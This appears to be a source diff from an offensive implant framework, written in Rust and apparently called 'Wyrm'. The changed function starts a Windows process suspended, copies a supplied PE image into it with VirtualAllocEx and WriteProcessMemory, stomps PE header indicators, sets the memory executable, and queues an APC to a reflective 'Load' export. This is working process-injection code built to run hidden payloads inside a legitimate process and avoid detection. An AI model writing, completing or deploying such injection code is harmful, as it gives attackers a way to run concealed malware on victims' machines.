@@ -1,35 +1,36 @@
 use std::{
     ffi::c_void,
     mem::transmute,
-    ptr::{copy_nonoverlapping, null_mut, read_unaligned},
+    ptr::{null_mut, read_unaligned},
 };
 
 use shared::tasks::WyrmResult;
 use str_crypter::{decrypt_string, sc};
 use windows_sys::{
     Win32::{
-        Foundation::{CloseHandle, FALSE, GetLastError},
+        Foundation::{CloseHandle, FALSE, GetLastError, HANDLE},
         System::{
-            Diagnostics::Debug::IMAGE_NT_HEADERS64,
+            Diagnostics::Debug::WriteProcessMemory,
             Memory::{
-                GetProcessHeap, HEAP_ZERO_MEMORY, HeapAlloc, MEM_COMMIT, MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx, VirtualProtect,
+                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
+                VirtualProtectEx,
             },
             SystemServices::IMAGE_DOS_HEADER,
             Threading::{
-                CREATE_SUSPENDED, CreateProcessA, DeleteProcThreadAttributeList,
-                EXTENDED_STARTUPINFO_PRESENT, InitializeProcThreadAttributeList,
-                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PROCESS_INFORMATION, QueueUserAPC,
-                ResumeThread, STARTUPINFOEXA, STARTUPINFOW_FLAGS, UpdateProcThreadAttribute,
+                CREATE_SUSPENDED, CreateProcessA, GetProcessId, PROCESS_INFORMATION, QueueUserAPC,
+                ResumeThread, STARTUPINFOA,
             },
         },
     },
-    core::PSTR,
+    core::PCSTR,
 };
 
-use crate::utils::{export_resolver::find_export_address, pe_stomp::stomp_pe_header_bytes};
+use crate::{
+    dbgprint,
+    utils::{export_resolver::find_export_from_unmapped_file, pe_stomp::stomp_pe_header_bytes},
+};
 
-const SPAWN_AS_IMAGE: &str = r"C:\Windows\System32\svchost.exe";
+const SPAWN_AS_IMAGE: &str = "C:\\Windows\\System32\\notepad.exe\0";
 
 pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
     //
@@ -37,44 +38,25 @@ pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
     // svchost as the default image.
     //
     let mut pi = PROCESS_INFORMATION::default();
-    let mut si = STARTUPINFOEXA::default();
-    si.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as _;
-    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
-    let mut attr_size: usize = 0;
+    let mut si = STARTUPINFOA::default();
+    si.cb = size_of::<STARTUPINFOA>() as u32;
 
-    let _ = unsafe { InitializeProcThreadAttributeList(null_mut(), 1, 0, &mut attr_size) };
+    let mut cmd = b"C:\\Windows\\System32\\svchost.exe\0".to_vec();
 
-    let attr_list = unsafe { HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attr_size) };
+    let image_path = PCSTR::from(SPAWN_AS_IMAGE.as_ptr() as _);
 
-    let _ = unsafe { InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size) };
-    let policy = 0x00000001u64 << 44;
-
-    let _ = unsafe {
-        UpdateProcThreadAttribute(
-            attr_list,
-            0,
-            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
-            &policy as *const _ as *const c_void,
-            std::mem::size_of::<u64>(),
-            null_mut(),
-            null_mut(),
-        )
-    };
-    si.lpAttributeList = attr_list;
-
-    let image_path = PSTR::from(SPAWN_AS_IMAGE.as_ptr() as _);
     let result_create_process = unsafe {
         CreateProcessA(
             null_mut(),
-            image_path,
+            cmd.as_mut_ptr(),
             null_mut(),
             null_mut(),
             FALSE,
-            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
+            CREATE_SUSPENDED,
             null_mut(),
             null_mut(),
-            &si.StartupInfo,
-            &mut pi,
+            &si as *const STARTUPINFOA,
+            &mut pi as *mut PROCESS_INFORMATION,
         )
     };
 
@@ -96,7 +78,18 @@ pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
         return WyrmResult::Err::<String>(msg);
     }
 
-    unsafe { DeleteProcThreadAttributeList(attr_list) };
+    let pid = unsafe { GetProcessId(pi.hProcess) };
+    if pid == 0 {
+        println!("Handle was invalid");
+        return WyrmResult::Err(unsafe { GetLastError() }.to_string());
+    }
+
+    println!(
+        "hProcess = 0x{:X}, hThread = 0x{:X}, pid={}",
+        pi.hProcess as usize,
+        pi.hThread as usize,
+        unsafe { GetProcessId(pi.hProcess) }
+    );
 
     //
     // Allocate the memory + copy our process image in (stomping some indicators in the process of)
@@ -129,12 +122,23 @@ pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
     // or the reflective loader export "Load".
     //
 
-    let p_start = find_start_address(&buf, p_alloc as _);
+    let Some(p_start) = find_start_address(&buf, p_alloc as _) else {
+        println!("Failed to find start address");
+        return WyrmResult::Err("Failed to find start".to_string());
+    };
 
     // Mark memory RWX
 
     let mut old_protect = 0;
-    let _ = unsafe { VirtualProtect(p_alloc, buf.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) };
+    let _ = unsafe {
+        VirtualProtectEx(
+            pi.hProcess,
+            p_alloc,
+            buf.len(),
+            PAGE_EXECUTE_READWRITE,
+            &mut old_protect,
+        )
+    };
 
     let result_queue_apc = match p_start {
         StartAddress::Load(addr) => {
@@ -191,7 +195,7 @@ enum StartAddress {
 /// `buf`: The user specified buffer containing an image to search through
 /// `base_original_allocation`: A pointer to the actual memory allocation which is used to compute the actual start address
 ///   accounting for allocation size etc.
-fn find_start_address(buf: &Vec<u8>, base_original_allocation: *const u8) -> StartAddress {
+fn find_start_address(buf: &Vec<u8>, base_original_allocation: *const u8) -> Option<StartAddress> {
     //
     // The strategy here will be first to search for the "Load" export. If the image does not have this export, the fallback
     // option will be to return the AddressOfEntrypoint.
@@ -200,29 +204,42 @@ fn find_start_address(buf: &Vec<u8>, base_original_allocation: *const u8) -> Sta
     // TODO write some docs for this requirement.
     //
 
-    let p_base = buf.as_ptr();
-    let dos = unsafe { read_unaligned(p_base as *const IMAGE_DOS_HEADER) };
-    let mapped_nt_ptr = (p_base as usize + dos.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+    if buf.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
+        println!("Buffer too small! Sz: {}", buf.len());
+    }
 
-    match find_export_address(p_base as _, mapped_nt_ptr, "Load") {
+    let dos = unsafe { read_unaligned(buf.as_ptr() as *const IMAGE_DOS_HEADER) };
+    let nt_ptr = unsafe { buf.as_ptr().add(dos.e_lfanew as usize) } as *const u8;
+
+    match find_export_from_unmapped_file(buf.as_ptr() as _, nt_ptr as _, "Load") {
         Some(p) => {
-            let addr = calculate_memory_delta(p_base as usize, p as usize);
+            dbgprint!("Found export address at: {p:p}");
+            let addr = calculate_memory_delta(buf.as_ptr() as usize, p as usize)?;
             let addr_calculated = unsafe { base_original_allocation.add(addr) };
-            StartAddress::Load(addr_calculated as _)
+            dbgprint!("Calculated offset: {addr_calculated:p}");
+            Some(StartAddress::Load(addr_calculated as _))
         }
         None => {
+            dbgprint!("DID NOT FIND EXPORT ADDRESS");
+            return None;
             // Use AddressOfEntrypoint instead
-            let address_entry_rva = unsafe { *mapped_nt_ptr }.OptionalHeader.AddressOfEntryPoint;
-            let p_fn_start = unsafe { p_base.add(address_entry_rva as usize) };
-            let addr = calculate_memory_delta(p_base as _, p_fn_start as _);
-            let addr_calculated = unsafe { base_original_allocation.add(addr) };
-            StartAddress::AddressOfEntryPoint(addr_calculated as _)
+            // let address_entry_rva = unsafe { *mapped_nt_ptr }.OptionalHeader.AddressOfEntryPoint;
+            // let p_fn_start = unsafe { p_base.add(address_entry_rva as usize) };
+            // let addr = calculate_memory_delta(p_base as _, p_fn_start as _)?;
+            // let addr_calculated = unsafe { base_original_allocation.add(addr) };
+            // Some(StartAddress::AddressOfEntryPoint(addr_calculated as _))
         }
     }
 }
 
-fn calculate_memory_delta(buf_start_address: usize, fn_ptr_address: usize) -> usize {
-    fn_ptr_address.saturating_sub(buf_start_address)
+fn calculate_memory_delta(buf_start_address: usize, fn_ptr_address: usize) -> Option<usize> {
+    let res = fn_ptr_address.saturating_sub(buf_start_address);
+
+    if res == 0 {
+        return None;
+    }
+
+    Some(res)
 }
 
 /// Allocates and writes memory pages in a remote process with `PAGE_READWRITE` protection
@@ -231,10 +248,21 @@ fn calculate_memory_delta(buf_start_address: usize, fn_ptr_address: usize) -> us
 /// # Returns
 /// If successful will return the address of the allocation; if it fails, will return the error
 /// produced from calling `GetLastError`
-fn write_image_rw(h_process: *const c_void, buf: &mut Vec<u8>) -> Result<*const c_void, u32> {
+fn write_image_rw(h_process: HANDLE, buf: &mut Vec<u8>) -> Result<*const c_void, u32> {
+    let pid = unsafe { GetProcessId(h_process) };
+    println!(
+        "[write_image_rw] h_process=0x{:X} pid={}",
+        h_process as usize, pid
+    );
+    if pid == 0 {
+        let gle = unsafe { GetLastError() };
+        println!("[write_image_rw] GetProcessId failed gle=0x{:X}", gle);
+        return Err(gle);
+    }
+
     let p_alloc = unsafe {
         VirtualAllocEx(
-            h_process as _,
+            h_process,
             null_mut(),
             buf.len(),
             MEM_COMMIT | MEM_RESERVE,
@@ -243,6 +271,7 @@ fn write_image_rw(h_process: *const c_void, buf: &mut Vec<u8>) -> Result<*const 
     };
 
     if p_alloc.is_null() {
+        println!("{}", sc!("Failed to run VirtualAllocEx", 97).unwrap());
         return Err(unsafe { GetLastError() });
     }
 
@@ -256,7 +285,13 @@ fn write_image_rw(h_process: *const c_void, buf: &mut Vec<u8>) -> Result<*const 
     // Now write the memory
     //
 
-    unsafe { copy_nonoverlapping(buf.as_ptr(), p_alloc as _, buf.len()) };
+    let res =
+        unsafe { WriteProcessMemory(h_process, p_alloc, buf.as_ptr() as _, buf.len(), null_mut()) };
+
+    if res == 0 {
+        println!("{}", sc!("Failed to run WriteProcessMemory", 97).unwrap());
+        return Err(unsafe { GetLastError() });
+    }
 
     Ok(p_alloc)
 }
